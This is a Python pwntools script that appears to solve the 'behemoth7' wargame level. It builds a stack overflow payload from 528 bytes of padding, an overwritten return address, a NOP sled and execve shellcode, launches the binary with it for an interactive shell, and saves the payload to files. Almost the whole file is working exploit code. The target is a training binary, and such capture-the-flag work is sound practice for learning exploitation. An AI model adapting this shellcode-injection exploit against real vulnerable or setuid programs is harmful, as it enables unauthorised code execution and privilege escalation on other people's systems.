from pwn import *

excl = list()
for i in range(0, 256):
    if not (65 <= i <= 90 or 97 <= i <= 122):
        excl.append(chr(i))

elf = ELF('./behemoth7')
context.terminal = ["tmux", "splitw", "-h"]

payload = b'A' * 528
payload += p32(0xffffcca4 + 120)
payload += b'\x90' * 240
payload += asm(shellcraft.sh())

p = elf.process(argv=[payload])
#p = gdb.debug(['./behemoth7', payload],  gdbscript='''
#        break _start
#        continue
#        ''')

#pause()

#log.info(p.clean())
p.interactive()

with open("command.sh", "wb") as o:
    o.write(b"#!/bin/bash\n")
    o.write(b'./behemoth7 ' + payload)

with open("payload", "wb") as o:
    o.write(payload)
